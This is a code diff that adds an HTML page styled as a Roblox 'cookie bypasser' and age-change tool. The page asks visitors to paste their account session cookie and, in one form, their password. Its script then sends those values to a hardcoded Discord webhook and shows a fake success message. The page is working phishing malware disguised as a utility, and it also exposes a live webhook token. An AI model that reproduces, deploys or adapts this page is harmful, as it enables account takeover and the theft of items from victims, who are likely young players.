@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>HYDRA X FORCER</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      font-family: sans-serif;
+      background: #1a1b3a;
+      color: white;
+      overflow-x: hidden;
+    }
+
+    #particles-js {
+      position: fixed;
+      width: 100%;
+      height: 100%;
+      top: 0;
+      left: 0;
+      z-index: 0;
+    }
+
+    .content {
+      position: relative;
+      z-index: 1;
+      padding: 20px;
+      max-width: 500px;
+      margin: 0 auto;
+      animation: fadeIn 1s ease-out;
+    }
+
+    .section {
+      margin-bottom: 30px;
+      opacity: 0;
+      transform: translateY(30px);
+      animation: slideIn 0.8s forwards;
+    }
+
+    .section:nth-child(1) { animation-delay: 0.2s; }
+    .section:nth-child(2) { animation-delay: 0.4s; }
+    .section:nth-child(3) { animation-delay: 0.6s; }
+
+    h3, label {
+      margin: 0 0 5px;
+      color: white;
+      font-size: 1.2em;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      margin: 5px 0 15px;
+      border: 1px solid white;
+      border-radius: 5px;
+      background: transparent;
+      color: white;
+      font-size: 1em;
+    }
+
+    .btn {
+      width: 100%;
+      background: white;
+      color: #1a1b3a;
+      padding: 12px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-weight: bold;
+      font-size: 1em;
+      transition: all 0.3s ease;
+    }
+
+    .btn:hover {
+      background: #e0e0e0;
+      box-shadow: 0 0 10px #ffffff88;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    @keyframes slideIn {
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    @media screen and (max-width: 600px) {
+      .content {
+        padding: 15px;
+      }
+
+      h3 {
+        font-size: 1em;
+      }
+
+      input, .btn {
+        font-size: 1em;
+        padding: 10px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div id="particles-js"></div>
+
+  <div class="content">
+    <div class="section">
+      <h3>𝙲𝙾𝙾𝙺𝙸𝙴 𝙱𝚈𝙿𝙰𝚂𝚂𝙴𝚁🍪</h3>
+      <label>𝙲𝚘𝚘𝚔𝚒𝚎 𝚁𝚎𝚚𝚞𝚒𝚛𝚎𝚍</label>
+      <input type="text" id="ageInput" placeholder="_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_">
+      <button class="btn" onclick="sendAge()">BYPASSER</button>
+    </div>
+
+    <div class="section">
+      <h3>𝙵𝚘𝚛𝚌𝚎 13+ to &lt;13</h3>
+      <label>𝙲𝚘𝚘𝚔𝚒𝚎 𝚁𝚎𝚚𝚞𝚒𝚛𝚎𝚍</label>
+      <input type="text" id="adminInput" placeholder="_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_">
+      <label>𝙿𝚊𝚜𝚜𝚠𝚘𝚛𝚍 𝚁𝚎𝚚𝚞𝚒𝚛𝚎𝚍</label>
+      <input type="text" id="modInput" placeholder="Password">
+      <button class="btn" onclick="sendAdmin()">⚠️ 13+</button>
+    </div>
+
+    <div class="section">
+      <h3> 𝙵𝚘𝚛𝚌𝚎 13> 𝚝𝚘 13+ 🔥 </h3>
+      <label>𝙲𝚘𝚘𝚔𝚒𝚎 𝚁𝚎𝚚𝚞𝚒𝚛𝚎𝚍</label>
+      <input type="text" id="fireAdminInput" placeholder="_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_">
+      <button class="btn" onclick="sendFire()"> 13>⚠️</button>
+    </div>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
+
+  <!-- JS for Sending to Webhook -->
+  <script>
+    const webhookURL = "https://discord.com/api/webhooks/1399188465559801916/pzg0N00OGj2lT2VYQRu0C-8BiH0LVd9-o0MSmYucgW7HErf06_1J-v2tGoDKOivzgrqw";
+
+function sendToDiscord(message) {
+  fetch(webhookURL, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      embeds: [
+        {
+          description: `\`\`${message}\`\``,
+          color: 0xFFFFFF // White
+        }
+      ]
+    })
+  }).then(() => {
+    alert("✅ Successful! Check it now!");
+  });
+}
+
+    function sendAge() {
+      const age = document.getElementById("ageInput").value;
+      sendToDiscord(`Cookie🍪:\nCookie: ${age}`);
+    }
+
+    function sendAdmin() {
+      const admin = document.getElementById("adminInput").value;
+      const mod = document.getElementById("modInput").value;
+      sendToDiscord(`AGE 13+ TO 13>:\nCookie: ${admin}\nPassword: ${mod}`);
+    }
+
+    function sendFire() {
+      const fireAdmin = document.getElementById("fireAdminInput").value;
+      sendToDiscord(`FORCE 13> TO 13+:\nCOOKIE: ${fireAdmin}`);
+    }
+
+    particlesJS("particles-js", {
+      "particles": {
+        "number": { "value": 80, "density": { "enable": true, "value_area": 800 } },
+        "color": { "value": "#ffffff" },
+        "shape": { "type": "circle" },
+        "opacity": { "value": 0.5 },
+        "size": { "value": 3, "random": true },
+        "line_linked": {
+          "enable": true,
+          "distance": 150,
+          "color": "#ffffff",
+          "opacity": 0.4,
+          "width": 1
+        },
+        "move": {
+          "enable": true,
+          "speed": 3,
+          "direction": "none",
+          "out_mode": "bounce"
+        }
+      },
+      "interactivity": {
+        "detect_on": "canvas",
+        "events": {
+          "onhover": { "enable": true, "mode": "grab" },
+          "resize": true
+        },
+        "modes": {
+          "grab": {
+            "distance": 140,
+            "line_linked": { "opacity": 1 }
+          }
+        }
+      },
+      "retina_detect": true
+    });
+  </script>
+
+</body>
+</html>
